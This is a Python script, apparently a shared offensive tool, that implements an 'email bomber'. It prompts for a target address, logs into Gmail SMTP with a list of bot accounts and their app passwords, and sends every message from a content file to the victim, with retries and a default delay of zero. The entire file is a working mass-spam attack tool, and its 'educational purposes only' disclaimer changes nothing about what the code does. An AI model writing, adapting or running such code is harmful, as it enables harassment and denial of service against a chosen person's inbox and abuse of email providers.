# By sug023
# THIS SCRIPT HAS BEEN CREATED FOR INFORMATIONAL AND EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY CONSEQUENCES. USE IT AT YOUR OWN RISK.

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import json
import re
from pathlib import Path
import sys
import time

# Banner for the script
banner = r"""
 ________  ___  ________  ___  __    ________  ________  _____ ______   ________  _______   ________     
|\   __  \|\  \|\   ____\|\  \|\  \ |\   __  \|\   __  \|\   _ \  _   \|\   __  \|\  ___ \ |\   __  \    
\ \  \|\  \ \  \ \  \___|\ \  \/  /|\ \  \|\ /\ \  \|\  \ \  \\\__\ \  \ \  \|\ /\ \   __/|\ \  \|\  \   
 \ \   _  _\ \  \ \  \    \ \   ___  \ \   __  \ \  \\\  \ \  \\|__| \  \ \   __  \ \  \_|/_\ \   _  _\  
  \ \  \\  \\ \  \ \  \____\ \  \\ \  \ \  \|\  \ \  \\\  \ \  \    \ \  \ \  \|\  \ \  \_|\ \ \  \\  \| 
   \ \__\\ _\\ \__\ \_______\ \__\\ \__\ \_______\ \_______\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ 
    \|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|_______|\|__|     \|__|\|_______|\|_______|\|__|\|__|

                                                                                                        @sug023
"""

class EmailBomber:

    def __init__(self, banner=banner):
        # Paths to the credentials and content files
        self.credentials_path = self.get_script_dir() / "bots.txt"
        self.content_path = self.get_script_dir() / "content.json"
        # Target email and other configurations
        self.target_email = None
        self.credentials = []
        self.email_content = []
        self.delay = 0
        self.retry_interval = 5
        self.max_retries = 36
        self.banner = banner

    def print_gradient_banner(self):
        # Clear the console screen
        os.system('cls' if os.name == 'nt' else 'clear')
        # Split the banner into lines
        lines = self.banner.splitlines()
        # Define the start and end colors for the gradient
        start_color = (255, 0, 0)
        end_color = (128, 0, 128)
        # Print each line with a gradient effect
        for line in lines:
            line_len = len(line)
            for i, char in enumerate(line):
                # Calculate the color for each character
                r = int(start_color[0] + (end_color[0]-start_color[0])*i/max(1,line_len-1))
                g = int(start_color[1] + (end_color[1]-start_color[1])*i/max(1,line_len-1))
                b = int(start_color[2] + (end_color[2]-start_color[2])*i/max(1,line_len-1))
                # Print the character with the calculated color
                print(f"\033[38;2;{r};{g};{b}m{char}", end='')
            print("\033[0m")

    def find_file(self, file_name: str) -> str:
        # Check if the file exists in the current directory
        if os.path.exists(file_name):
            return file_name
        # Check if the file exists in the working directory
        working_dir = os.getcwd()
        file_path = os.path.join(working_dir, file_name)
        if os.path.exists(file_path):
            return file_path
        # Return None if the file is not found
        return None

    def read_credentials(self):
        # Find the credentials file
        file_path = self.find_file(str(self.credentials_path))
        # Validate the file
        if not file_path or not self.validate_file(file_path, 'txt'):
            raise FileNotFoundError(f"[!] The file {self.credentials_path} does not exist or is not a valid .txt file.")

        # Read and process the credentials file
        with open(file_path, 'r') as f:
            for line in f:
                try:
                    email, app_password = line.strip().split('/')
                    # Validate the email format
                    if not self.check_email(email):
                        raise ValueError(f"Invalid email format: {email}")
                    self.credentials.append((email, app_password))

                except ValueError as e:
                    print(f"[!] Incorrect format in line: {line.strip()}. Error: {e}")

    def read_content(self):
        # Find the content file
        file_path = self.find_file(str(self.content_path))
        # Validate the file
        if not file_path or not self.validate_file(file_path, 'json'):
            raise FileNotFoundError(f"[!] The file {self.content_path} does not exist or is not a valid .json file.")

        # Read and process the content file
        with open(file_path, 'r', encoding='utf-8') as f:
            try:
                data = json.load(f)
                if isinstance(data, dict):
                    for key, value in data.items():
                        self.email_content.append((key, value))
                else:
                    print("[!] The JSON file is not a valid dictionary.")

            except json.JSONDecodeError as e:
                print(f"[!] Error decoding JSON: {e}")

    def bomb_email(self, server):
        def send_email(server, email, app_password):
            retries = 0

            while retries < self.max_retries:
                try:
                    # Login to the email server
                    server.login(email, app_password)
                    print(f"\033[1;32m[+] Successful login from {email}\033[0m")

                    # Send emails with the specified content
                    for subject, message in self.email_content:
                        msg = MIMEMultipart()
                        msg['From'] = email
                        msg['To'] = self.target_email
                        msg['Subject'] = subject
                        msg.attach(MIMEText(message, 'plain'))

                        server.sendmail(email, self.target_email, msg.as_string())
                        print(f"\033[1;34m[+] Email sent from {email} to {self.target_email} with subject: {subject}\033[0m")

                    return True

                except smtplib.SMTPAuthenticationError:
                    print(f"\033[1;31m[!] Authentication error for {email}\033[0m")
                    return False

                except smtplib.SMTPException as e:
                    print(f"\033[1;31m[!] Error sending email from {email}: {e}\033[0m")
                    retries += 1
                    time.sleep(self.retry_interval)

            return False

        # Send emails using the provided credentials
        for email, app_password in self.credentials:
            if send_email(server, email, app_password):
                time.sleep(self.delay)

    def get_script_dir(self):
        # Get the directory of the script
        if getattr(sys, "frozen", False):
            return  Path(sys._MEIPASS or sys.executable).resolve().parent
        try:
            return Path(__file__).resolve().parent
        except NameError:
            return Path(sys.argv[0]).resolve().parent if sys.argv and sys.argv[0] else Path.cwd()

    def spam_email(self):
        # Initialize the target email, credentials, and content
        self.target_email = self.target_email
        self.credentials = []
        self.email_content = []
        self.read_credentials()
        self.read_content()

        try:
            # Connect to the SMTP server
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            self.bomb_email(server)
            server.quit()
        except smtplib.SMTPException as e:
            print(f"\033[1;31m[!] SMTP connection error: {e}\033[0m")

    @staticmethod
    def check_email(email: str) -> bool:
        # Regular expression pattern for validating an email
        pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(pattern, email) is not None

    @staticmethod
    def validate_file(file_path: str, extension: str) -> bool:
        # Check if the file exists and has the correct extension
        if not os.path.exists(file_path):
            return False
        if not file_path.endswith(f'.{extension}'):
            return False
        return True

    def run(self):
        # Print the banner and prompt the user for input
        self.print_gradient_banner()
        self.target_email = input("\033[1;33m[+] Enter the target email address: \033[0m")
        while not self.check_email(self.target_email):
            self.print_gradient_banner()
            print("\033[1;31m[!] Invalid email format. Please try again.\033[0m\n")
            self.target_email = input("\033[1;33m[+] Enter the target email address: \033[0m")

        self.print_gradient_banner()
        self.content_path = input("\033[1;33m[+] Enter the path to the content JSON file (default: content.json): \033[0m") or self.content_path
        self.print_gradient_banner()
        self.credentials_path = input("\033[1;33m[+] Enter the path to the credentials file (default: bots.txt): \033[0m") or self.credentials_path
        self.print_gradient_banner()
        self.delay = int(input("\033[1;33m[+] Enter the delay between emails in seconds (default: 0): \033[0m") or 0)

        # Start the email bombing process
        self.spam_email()

es = EmailBomber()
es.run()